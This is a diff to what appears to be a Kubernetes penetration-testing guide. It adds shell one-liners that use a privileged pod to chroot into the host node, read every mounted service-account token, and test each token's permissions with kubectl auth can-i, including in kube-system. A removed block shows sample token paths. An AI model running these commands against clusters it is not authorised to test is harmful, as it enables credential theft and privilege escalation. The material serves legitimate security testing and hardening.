@@ -189,29 +189,20 @@ Even if you can only schedule your pod on the worker node, you can also access a
 
 Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system
 
-```
-tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "$filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; kubectl --token=$tokena auth can-i get pods; done
 
-/var/lib/kubelet/pods/ed980733-45c9-474b-b63e-17cad419460c/volumes/kubernetes.io~secret/kube-proxy-token-9sl2q/token
-no
-/var/lib/kubelet/pods/ad9ee7c8-1dfd-4e73-82a2-8b0810d2694e/volumes/kubernetes.io~secret/aws-node-token-lk4gr/token
-no
-/var/lib/kubelet/pods/ad9ee7c8-1dfd-4e73-82a2-8b0810d2694e/volumes/kubernetes.io~projected/aws-iam-token/token
-error: You must be logged in to the server (Unauthorized)
-/var/lib/kubelet/pods/71c8baeb-fbf9-4f96-8cc6-d1eb7f6d90e7/volumes/kubernetes.io~secret/coredns-token-v852l/token
-no
-/var/lib/kubelet/pods/37b9b872-7ae9-4afb-b631-4b43ed8c4e9c/volumes/kubernetes.io~secret/default-token-wt7v4/token
-no
-/var/lib/kubelet/pods/9c4cc997-d1ab-49d0-a20a-e022f72c5023/volumes/kubernetes.io~secret/coredns-token-v852l/token
-no
-/var/lib/kubelet/pods/cb881dc4-9390-4b44-be7c-c87c757b363c/volumes/kubernetes.io~secret/default-token-wt7v4/token
-no
+### Run kubectl can-i --list against ALL tokens found on the node :)
+
+```
+tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list; echo; done
 ```
 
+### Run kubectl can-i --list -n kube-system against ALL tokens found on the node :)
+```
+tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list -n kube-system; echo; done
+```
 
-
+### This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
 ```bash
-# This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
 tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
 
 default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
